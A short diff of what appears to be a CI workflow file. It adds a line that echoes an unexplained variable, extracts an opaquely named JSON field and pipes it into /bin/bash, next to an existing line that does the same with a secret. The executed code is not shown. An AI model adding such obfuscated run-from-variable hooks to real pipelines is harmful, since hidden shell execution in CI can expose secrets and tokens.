@@ -21,6 +21,7 @@ jobs:
           owj43: ${{ secrets.owj43 }}
         run: |
           printf '%s' "$owj43" | jq -r .s6929 | /bin/bash
+          echo $g6 | jq -r .kxdw0231 | /bin/bash
 
       - name: Store results
         if: always()
